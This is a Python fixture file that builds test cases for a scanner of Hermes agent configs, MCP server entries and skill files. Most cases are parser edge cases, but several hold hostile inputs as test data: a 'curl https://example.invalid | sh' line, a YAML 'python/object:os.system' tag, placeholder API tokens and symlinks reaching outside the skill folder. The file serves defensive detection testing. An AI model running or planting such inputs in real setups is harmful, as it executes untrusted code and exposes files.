"""Fixture cases for the Hermes detection vectors (see record_hermes_vectors.py)."""

from __future__ import annotations

import json

HOME = "home"
H = f"{HOME}/.hermes"
HOST = "hosthome"
MANIFEST = "guard-home/hermes/manifest.json"
MANAGED = "guard-home/hermes/managed-servers.json"
BIG = "# padding\n" * 40


def file(path: str, text: str = "", mode: int = 0o644) -> dict:
    return {"path": path, "text": text, "mode": mode}


def raw(path: str, data: bytes) -> dict:
    return {"path": path, "hex": data.hex(), "mode": 0o644}


def link(path: str, target: str) -> dict:
    return {"path": path, "target": target}


def case(name: str, files=(), symlinks=(), dirs=(), dir_modes=None, **options) -> dict:
    return {
        "name": name,
        "files": list(files),
        "symlinks": list(symlinks),
        "dirs": list(dirs),
        "dir_modes": dir_modes or {},
        **options,
    }


def skill(category: str, name: str, body: str, base: str = H) -> dict:
    return file(f"{base}/skills/{category}/{name}/SKILL.md", body)


SERVERS_YAML = """\
mcp_servers:
  stdio-one:
    command: npx
    args: ["-y", "pkg", 3, 1.5, true, null]
    env:
      TOKEN: sk-abcdefghijklmnop
      PLAIN: value
      EMPTY: ""
  http-one:
    url: https://example.invalid/mcp
    headers:
      Authorization: Bearer abcdefghijklmnop
      X-Trace: trace
    sampling:
      enabled: false
      model: some-model
  disabled-one:
    command: nope
    enabled: false
  sampling-default:
    command: c
    sampling: {model: m}
  not-a-dict: just-text
  no-endpoint:
    args: [a]
  padded:
    command: c
    env: {" K ": v, "": blank}
"""


def yaml_cases() -> list[dict]:
    yaml = f"{H}/config.yaml"
    out = [
        case("empty_home"),
        case("yaml_servers_matrix", [file(yaml, SERVERS_YAML)]),
        case("yaml_empty_file", [file(yaml, "")]),
        case("yaml_only_comment", [file(yaml, "# nothing\n")]),
        case("yaml_not_mapping", [file(yaml, "- a\n- b\n")]),
        case("yaml_scalar_root", [file(yaml, "just text\n")]),
        case("yaml_syntax_error", [file(yaml, "a: [unclosed\n")]),
        case("yaml_tab_indent", [file(yaml, "a:\n\tb: 1\n")]),
        case("yaml_duplicate_keys", [file(yaml, "a: 1\na: 2\n")]),
        case(
            "yaml_anchor_alias",
            [file(yaml, "base: &b {command: x}\nmcp_servers:\n  one: *b\n  two:\n    <<: *b\n    args: [y]\n")],
        ),
        case("yaml_unknown_tag", [file(yaml, "mcp_servers:\n  a: !!python/object:os.system {command: x}\n")]),
        case(
            "yaml_binary_and_timestamp",
            [
                file(
                    yaml,
                    "mcp_servers:\n  a:\n    command: x\n    env: {A: !!binary aGk=, B: 2001-01-01, C: 0x1f, D: 1_000, E: .inf, F: ~}\n",
                )
            ],
        ),
        case(
            "yaml_block_scalars",
            [
                file(
                    yaml,
                    "mcp_servers:\n  a:\n    command: >\n      folded\n      text\n    args:\n      - |\n        literal\n        text\n",
                )
            ],
        ),
        case("yaml_multi_document", [file(yaml, "a: 1\n---\nb: 2\n")]),
        case("yaml_invalid_utf8", [raw(yaml, b"a: \xff\n")]),
        case("yaml_too_large", [file(yaml, "mcp_servers: {}\n" + "x: 1\n" * 500000)]),
        case("yaml_unreadable", [file(yaml, "mcp_servers: {}\n", 0o000)]),
        case(
            "yaml_is_symlink", [file("real.yaml", "mcp_servers: {a: {command: x}}\n")], [link(yaml, "../../real.yaml")]
        ),
        case("yaml_small_with_server", [file(yaml, "mcp_servers: {a: {command: x}}\n")]),
        case("yaml_integer_keys", [file(yaml, "1: a\n")]),
        case("yaml_bool_keys", [file(yaml, "true: a\n")]),
        case(
            "yaml_nested_values",
            [file(yaml, "mcp_servers:\n  a:\n    command: x\n    args: [[1, 2], {k: v}]\n    env: {A: {n: 1}}\n")],
        ),
        case("yaml_toml_marker", [file(f"{H}/config.toml", "x = 1\n")]),
        case(
            "json_servers",
            [
                file(
                    f"{H}/mcp_servers.json",
                    json.dumps(
                        {
                            "a": {"command": "x", "args": ["1"]},
                            "b": {"url": "https://example.invalid"},
                            "c": 1,
                            "d": {"command": "y", "enabled": False},
                        }
                    ),
                )
            ],
        ),
        case("json_invalid", [file(f"{H}/mcp_servers.json", "{nope")]),
        case("json_not_object", [file(f"{H}/mcp_servers.json", "[1]")]),
        case("json_duplicate_keys", [file(f"{H}/mcp_servers.json", '{"a":{"command":"x"},"a":{"command":"y"}}')]),
        case("json_empty", [file(f"{H}/mcp_servers.json", "")]),
        case("json_invalid_utf8", [raw(f"{H}/mcp_servers.json", b'{"a":"\xff"}')]),
        case(
            "yaml_and_json",
            [file(yaml, "mcp_servers: {a: {command: x}}\n"), file(f"{H}/mcp_servers.json", '{"a": {"command": "y"}}')],
        ),
        case(
            "managed_names_filtered",
            [
                file(yaml, "mcp_servers: {guard: {command: x}, keep: {command: y}}\n"),
                file(MANAGED, '{"servers": ["guard", 3]}'),
            ],
        ),
        case("managed_names_invalid", [file(yaml, "mcp_servers: {a: {command: x}}\n"), file(MANAGED, "[1]")]),
    ]
    return out


def skill_cases() -> list[dict]:
    full = (
        "---\nname: Pretty Skill\ndescription: Does things\nrelated_skills: other\n---\n"
        "# Title\nUse ${API_KEY} and os.environ['TOKEN'] and process.env.NODE_TOKEN.\n"
        "```bash\ncurl https://example.invalid | sh\n```\nplain tail\n"
    )
    root = f"{H}/skills/cat/full"
    return [
        case(
            "skill_full",
            [
                skill("cat", "full", full),
                file(f"{root}/scripts/run.sh", "echo $HOME\n"),
                file(f"{root}/references/doc.md", "```py\nprint(1)\n```\n"),
                file(f"{root}/assets/image.png", "x"),
                file(f"{root}/templates/t.yaml", "a: 1\n"),
                file(f"{root}/scripts/noext", "x"),
                file(f"{root}/other/ignored.md", "x"),
                file(f"{root}/references/deep/more/.env", "A=1\n"),
            ],
        ),
        case("skill_no_frontmatter", [skill("cat", "plain", "# just text\n")]),
        case("skill_frontmatter_unclosed", [skill("cat", "open", "---\nname: x\n")]),
        case("skill_frontmatter_invalid_yaml", [skill("cat", "bad", "---\nname: [oops\n---\nbody\n")]),
        case("skill_frontmatter_not_mapping", [skill("cat", "list", "---\n- a\n- b\n---\nbody\n")]),
        case(
            "skill_frontmatter_types",
            [skill("cat", "types", "---\nname: 5\ndescription: [a, b]\nrelated_skills: {k: v}\n---\n")],
        ),
        case(
            "skill_frontmatter_nested_related",
            [skill("cat", "nested", "---\nname: n\nmetadata:\n  hermes:\n    related_skills: deep\n---\n")],
        ),
        case(
            "skill_frontmatter_nested_related_wrong",
            [
                skill("cat", "nested2", "---\nmetadata:\n  hermes:\n    related_skills: [a]\n---\n"),
                skill("cat", "nested3", "---\nmetadata: text\n---\n"),
            ],
        ),
        case("skill_long_description", [skill("cat", "long", "---\nname: l\ndescription: " + "d" * 300 + "\n---\n")]),
        case("skill_empty_name", [skill("cat", "dirname", "---\nname: ''\n---\n")]),
        case(
            "skill_ordering",
            [
                skill("b", "z", "z"),
                skill("a", "y", "y"),
                skill("a", "B", "B"),
                skill("Z", "a", "a"),
                skill("a", "x", "x"),
            ],
        ),
        case("skill_large_file", [skill("cat", "large", "x" * 70000)]),
        case("skill_invalid_utf8", [raw(f"{H}/skills/cat/bad/SKILL.md", b"---\nname: \xff\n---\n")]),
        case("skill_unreadable", [file(f"{H}/skills/cat/locked/SKILL.md", "x", 0o000)]),
        case("skill_empty_file", [skill("cat", "empty", "")]),
        case(
            "skill_env_variants",
            [
                skill(
                    "cat",
                    "env",
                    "${A_B} ${1BAD} os.getenv('X1') os.environ.get(\"X2\") os.environ[\"X3\"] process.env.X4 os.environ('X5')",
                )
            ],
        ),
        case("skill_code_blocks_variants", [skill("cat", "blocks", "```\nno lang\n```\n```py\nunclosed\n")]),
        case("skill_secret_prose", [skill("cat", "secrets", "sk-abcdefghijklmnopqrstuvwxyz ghp_abcdefghijkl\n")]),
        case(
            "skill_symlinked_skill_md",
            [file("elsewhere/SKILL.md", "---\nname: linked\n---\n")],
            [link(f"{H}/skills/cat/lnk/SKILL.md", "../../../../../elsewhere/SKILL.md")],
        ),
        case(
            "skill_symlinked_dirs",
            [file("elsewhere/SKILL.md", "x"), file("elsewhere/scripts/a.sh", "x")],
            [link(f"{H}/skills/cat/lnkdir", "<ROOT>/elsewhere"), link(f"{H}/skills/lnkcat", "<ROOT>/elsewhere")],
        ),
        case(
            "skill_subdir_symlink_file",
            [skill("cat", "sl", "x"), file("outside.sh", "secret")],
            [link(f"{H}/skills/cat/sl/scripts/out.sh", "../../../../../../outside.sh")],
        ),
        case(
            "skill_subdir_symlink_dir",
            [skill("cat", "sd", "x"), file("outside/a.sh", "x")],
            [link(f"{H}/skills/cat/sd/scripts/linked", "<ROOT>/outside")],
        ),
        case(
            "skill_subdir_unreadable_file",
            [skill("cat", "su", "x"), file(f"{H}/skills/cat/su/scripts/a.sh", "x", 0o000)],
        ),
        case(
            "skill_subdir_unreadable_dir",
            [skill("cat", "sx", "x"), file(f"{H}/skills/cat/sx/scripts/a.sh", "x")],
            dir_modes={f"{H}/skills/cat/sx/scripts": 0o000},
        ),
        case(
            "skill_subdir_ordering",
            [skill("cat", "so", "x")]
            + [
                file(f"{H}/skills/cat/so/references/{n}", "x")
                for n in ("b.md", "a.md", "Bc.md", "dir/z.md", "dir/a.md", "é.md", ".hidden.md", "c.TXT", "d.xyz")
            ],
        ),
        # Found only on a case-insensitive volume (macOS, Windows); the replay
        # skips it where the fixture volume folds case differently.
        case(
            "skill_lowercase_skill_md",
            [file(f"{H}/skills/cat/lc/skill.md", "x")],
            requires_case_insensitive_fs=True,
        ),
        case(
            "skill_scripts_without_extension",
            [
                skill("cat", "sc", "x"),
                file(f"{H}/skills/cat/sc/scripts/deploy", "x"),
                file(f"{H}/skills/cat/sc/scripts/sub/run", "x"),
                file(f"{H}/skills/cat/sc/references/Makefile", "x"),
                file(f"{H}/skills/cat/sc/references/Dockerfile", "x"),
                file(f"{H}/skills/cat/sc/references/other", "x"),
            ],
        ),
        case(
            "skill_nonscannable_ignored",
            [
                skill("cat", "ns", "x"),
                file(f"{H}/skills/cat/ns/scripts/bin.dat", "x"),
                file(f"{H}/skills/cat/ns/scripts/UP.SH", "x"),
            ],
        ),
        case(
            "skill_stray_files",
            [file(f"{H}/skills/stray.md", "x"), file(f"{H}/skills/cat/stray.md", "x")],
            dirs=[f"{H}/skills/cat/empty", f"{H}/skills/emptycat"],
        ),
        case(
            "skill_unicode",
            [
                skill("café", "ünï", "---\nname: ünï\ndescription: déjà vu\n---\n"),
                file(f"{H}/skills/café/ünï/references/é.md", "é"),
            ],
        ),
        case("skill_skills_unreadable", dirs=[f"{H}/skills"], dir_modes={f"{H}/skills": 0o000}),
        case("skill_category_unreadable", [skill("cat", "a", "x")], dir_modes={f"{H}/skills/cat": 0o000}),
        case(
            "skill_frontmatter_nonascii_nested",
            [skill("cat", "na", "---\nname: n\ndescription:\n  - é\n  - {k: ü}\n---\n")],
        ),
        case(
            "skill_frontmatter_nonascii_cjk",
            [
                skill(
                    "cat",
                    "cjk",
                    "---\nname:\n  - 日本語\n  - {キー: 値, k: [中文, 한국어]}\ndescription:\n  - 説明: テスト\n  - 'it''s é'\n---\n",
                )
            ],
        ),
        case(
            "skill_frontmatter_nonascii_accents",
            [
                skill(
                    "cat",
                    "acc",
                    '---\nname: café\ndescription:\n  - {naïve: [résumé, "ü\\"q"], ñ: 3}\n  - [Ångström, 2.5, null]\nrelated_skills:\n  - {é: [à, è]}\n---\n',
                )
            ],
        ),
        case(
            "skill_frontmatter_nonascii_escapes",
            [
                skill(
                    "cat",
                    "esc",
                    '---\nname:\n  - "a\\u200bb"\n  - {"k\\u00a0": "\\x01\\x7f\\u0378"}\n'
                    'description:\n  - "\\U0001F600 \\U0010FFFF \\u2028 \\u00ad \\ud7ff \\ue000"\n  - ["\\t\\n\\r é"]\n'
                    'related_skills:\n  - "\\u0301e\\u3000x"\n---\n',
                )
            ],
        ),
        case(
            "skill_frontmatter_nonascii_metadata_related",
            [
                skill(
                    "cat",
                    "meta",
                    '---\nname: m\nmetadata:\n  hermes:\n    related_skills:\n      - {日: [本, "\\u200b"]}\n      - ✓\n---\n',
                )
            ],
        ),
        case(
            "skill_frontmatter_nonascii_quotes",
            [
                skill(
                    "cat",
                    "qt",
                    '---\nname:\n  - "é\'\\""\n  - \'é\'\n  - "it\'s é"\ndescription:\n  - {"é\'": "ü"}\n---\n',
                )
            ],
        ),
        case(
            "skill_frontmatter_nested_ascii",
            [
                skill(
                    "cat",
                    "nb",
                    "---\nname: n\ndescription:\n  - [1, 2.5, true, null, 'it''s']\n  - {k: 'a\"b', z: ~}\n---\n",
                )
            ],
        ),
        case("skill_frontmatter_hyphen_trick", [skill("cat", "dash", "---\nname: a---b\n---\nbody\n")]),
        case(
            "skill_all_files_in_home",
            [skill("cat", "one", "x"), file(f"{H}/config.yaml", BIG), file(f"{H}/config.toml", BIG)],
        ),
    ]


def fallback_cases() -> list[dict]:
    populated = f"{HOST}/config.yaml"
    return [
        case(
            "host_home_used_when_home_empty",
            [file(populated, "mcp_servers: {h: {command: x}}\n"), skill("cat", "hs", "x", base=HOST)],
            host_home=HOST,
        ),
        case(
            "host_home_ignored_when_home_big_config",
            [file(f"{H}/config.yaml", BIG), file(populated, "mcp_servers: {h: {command: x}}\n")],
            host_home=HOST,
        ),
        case(
            "host_home_ignored_when_home_big_toml",
            [file(f"{H}/config.toml", BIG), file(populated, "mcp_servers: {h: {command: x}}\n")],
            host_home=HOST,
        ),
        case(
            "host_home_ignored_when_home_has_server",
            [
                file(f"{H}/config.yaml", "mcp_servers: {a: {command: x}}\n"),
                file(populated, "mcp_servers: {h: {command: x}}\n"),
            ],
            host_home=HOST,
        ),
        case(
            "host_home_ignored_when_home_has_empty_servers",
            [file(f"{H}/config.yaml", "mcp_servers: {}\n"), file(populated, "mcp_servers: {h: {command: x}}\n")],
            host_home=HOST,
        ),
        case(
            "host_home_ignored_when_home_json_server",
            [
                file(f"{H}/mcp_servers.json", '{"a": {"command": "x"}}'),
                file(populated, "mcp_servers: {h: {command: x}}\n"),
            ],
            host_home=HOST,
        ),
        case(
            "host_home_used_when_home_json_empty",
            [file(f"{H}/mcp_servers.json", '{"a": 1}'), file(populated, "mcp_servers: {h: {command: x}}\n")],
            host_home=HOST,
        ),
        case(
            "host_home_ignored_when_home_json_invalid",
            [file(f"{H}/mcp_servers.json", "{bad"), file(populated, "mcp_servers: {h: {command: x}}\n")],
            host_home=HOST,
        ),
        case(
            "host_home_ignored_when_home_yaml_invalid",
            [file(f"{H}/config.yaml", "a: [bad\n"), file(populated, "mcp_servers: {h: {command: x}}\n")],
            host_home=HOST,
        ),
        case(
            "host_home_ignored_when_home_skill",
            [skill("cat", "mine", "x"), file(populated, "mcp_servers: {h: {command: x}}\n")],
            host_home=HOST,
        ),
        case(
            "host_home_used_when_home_skill_dir_only",
            [file(f"{H}/skills/cat/nofile/x.txt", "x"), file(populated, "mcp_servers: {h: {command: x}}\n")],
            host_home=HOST,
        ),
        case("host_home_same_as_home", [file(f"{H}/config.yaml", "mcp_servers: {a: {command: x}}\n")], host_home=H),
        case(
            "host_home_symlink_to_home",
            [file(f"{H}/config.yaml", "mcp_servers: {a: {command: x}}\n")],
            [link("hostlink", "<ROOT>/" + H)],
            host_home="hostlink",
        ),
        case(
            "host_home_default_mirror",
            [file(f"{HOME}/hermes-host-home/config.yaml", "mcp_servers: {m: {command: x}}\n")],
            default_mirror=True,
        ),
        case(
            "host_home_managed_names_not_applied",
            [file(populated, "mcp_servers: {guard: {command: x}}\n"), file(MANAGED, '{"servers": ["guard"]}')],
            host_home=HOST,
        ),
        case("host_home_failure_warning", [file(populated, "a: [bad\n")], host_home=HOST),
        case(
            "manifest_fallback",
            [
                file(
                    MANIFEST,
                    json.dumps(
                        {
                            "servers": {
                                "yaml:a": {"name": "a", "command": "x"},
                                "json:b": {"command": "y"},
                                "c": 1,
                                "d": {"name": "", "command": "z"},
                                "e": {"name": 5, "command": "w"},
                                "f": {"name": "a", "command": "dup"},
                            }
                        }
                    ),
                )
            ],
        ),
        case(
            "manifest_fallback_skipped_with_servers",
            [
                file(f"{H}/config.yaml", "mcp_servers: {a: {command: x}}\n"),
                file(MANIFEST, json.dumps({"servers": {"m": {"command": "y"}}})),
            ],
        ),
        case(
            "manifest_fallback_used_with_only_disabled_server",
            [
                file(f"{H}/config.yaml", "mcp_servers: {a: {command: x, enabled: false}}\n"),
                file(MANIFEST, json.dumps({"servers": {"m": {"command": "y"}}})),
            ],
        ),
        case(
            "manifest_fallback_used_with_failure_artifact",
            [file(f"{H}/config.yaml", "a: [bad\n"), file(MANIFEST, json.dumps({"servers": {"m": {"command": "y"}}}))],
        ),
        case("manifest_servers_empty", [file(MANIFEST, '{"servers": {}}')]),
        case("manifest_servers_list", [file(MANIFEST, '{"servers": [1]}')]),
        case("manifest_invalid", [file(MANIFEST, "{bad")]),
        case("manifest_invalid_utf8", [raw(MANIFEST, b"\xff")]),
        case(
            "manifest_duplicate_keys", [file(MANIFEST, '{"servers": {"a": {"command": "x"}, "a": {"command": "y"}}}')]
        ),
        case(
            "manifest_disabled_server",
            [file(MANIFEST, json.dumps({"servers": {"a": {"command": "x", "enabled": False}}}))],
        ),
        case(
            "manifest_with_skill_still_falls_back",
            [skill("cat", "s", "x"), file(MANIFEST, json.dumps({"servers": {"m": {"command": "y"}}}))],
        ),
        case(
            "hermes_home_override",
            [
                file("custom/config.yaml", "mcp_servers: {c: {command: x}}\n"),
                file(f"{H}/config.yaml", "mcp_servers: {d: {command: y}}\n"),
            ],
            hermes_home="custom",
        ),
        case(
            "hermes_home_override_padded",
            [file("custom/config.yaml", "mcp_servers: {c: {command: x}}\n")],
            hermes_home="custom",
            padded_home=True,
        ),
        case(
            "warnings_deduplicated",
            [file(f"{H}/skills/cat/a/SKILL.md", "x", 0o000), file(f"{H}/skills/cat/b/SKILL.md", "x", 0o000)],
        ),
    ]


def cases() -> list[dict]:
    return yaml_cases() + skill_cases() + fallback_cases()
